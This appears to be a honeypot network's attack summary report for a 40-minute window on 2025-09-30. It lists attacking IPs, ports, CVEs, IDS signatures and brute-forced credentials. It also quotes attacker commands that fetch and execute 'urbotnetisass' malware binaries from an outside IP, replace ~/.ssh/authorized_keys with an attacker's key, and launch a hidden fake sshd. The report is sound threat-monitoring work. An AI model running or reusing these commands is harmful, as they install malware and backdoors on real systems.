
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T20:01:49Z
**Timeframe:** 2025-09-30T19:20:01Z to 2025-09-30T20:00:01Z
**Files Used:**
- agg_log_20250930T192001Z.json
- agg_log_20250930T194001Z.json
- agg_log_20250930T200001Z.json

## Executive Summary
This report summarizes 6,566 attacks recorded by the honeypot network. The majority of attacks were captured by the Honeytrap, Suricata, and Ciscoasa honeypots. A significant portion of the attacks originated from a small group of IP addresses, consistently targeting port 22 (SSH). The most common attack vector appears to be brute-force login attempts and the deployment of malware. A recurring command was observed attempting to download and execute a number of files with the `.urbotnetisass` extension.

## Detailed Analysis

### Attacks by Honeypot
- Honeytrap: 2190
- Ciscoasa: 1402
- Suricata: 1474
- Cowrie: 1233
- Dionaea: 54
- Sentrypeer: 53
- Mailoney: 44
- H0neytr4p: 26
- Adbhoney: 23
- Honeyaml: 23
- Tanner: 13
- ConPot: 11
- Dicompot: 9
- Heralding: 6
- Redishoneypot: 3
- Ipphoney: 2

### Top Attacking IPs
- 185.156.73.166: 360
- 185.156.73.167: 359
- 92.63.197.55: 351
- 92.63.197.59: 326
- 181.42.63.126: 484
- 45.232.73.84: 159
- 23.94.26.58: 86
- 3.149.59.26: 71
- 185.196.220.34: 59
- 183.221.243.13: 55

### Top Targeted Ports/Protocols
- 22: 205
- 8333: 74
- 23: 58
- 5060: 49
- UDP/5060: 46
- 25: 44
- 443: 38
- 2323: 33
- 445: 30
- TCP/5432: 24

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012: 9
- CVE-2019-11500: 8
- CVE-2021-3449: 4
- CVE-2022-27255: 3
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255: 2
- CVE-2006-2369: 2
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 2

### Commands Attempted by Attackers
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ...
- uname -s -v -n -r -m
- system
- shell
- q
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- chmod +x ./.1113810570640818562/sshd;nohup ./.1113810570640818562/sshd &

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1: 368
- 2402000: 368
- ET SCAN NMAP -sS window 1024: 207
- 2009582: 207
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 69
- 2023753: 69
- ET INFO Reserved Internal IP Traffic: 57
- 2002752: 57

### Users / Login Attempts
- admin/admin01
- root/Ac123456
- nexus/nexus
- emmanuel/emmanuel
- root/Admin@123
- app/app
- root/
- root/adminHW
- root/zxc123
- debian/debian
- ts3/ts3
- user/123
- vpn/vpn

### Files Uploaded/Downloaded
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- json
- 11
- fonts.gstatic.com

### HTTP User-Agents
- No HTTP User-Agents were logged during this period.

### SSH Clients and Servers
- No SSH clients or servers were logged during this period.

### Top Attacker AS Organizations
- No attacker AS organizations were logged during this period.

## Key Observations and Anomalies
- A recurring attack campaign was identified, characterized by the execution of a shell script that downloads and runs multiple malicious files. This suggests an automated attack targeting a range of architectures.
- The vast majority of attacks are from a small set of IPs, indicating a targeted or persistent attacker.
- The high number of login attempts with common and default credentials underscores the continued threat of brute-force attacks.
- The presence of commands to modify SSH authorized_keys files indicates attempts to establish persistent access.
- The `urbotnetisass` malware seems to be a significant threat in this timeframe. Further investigation into its capabilities is recommended.
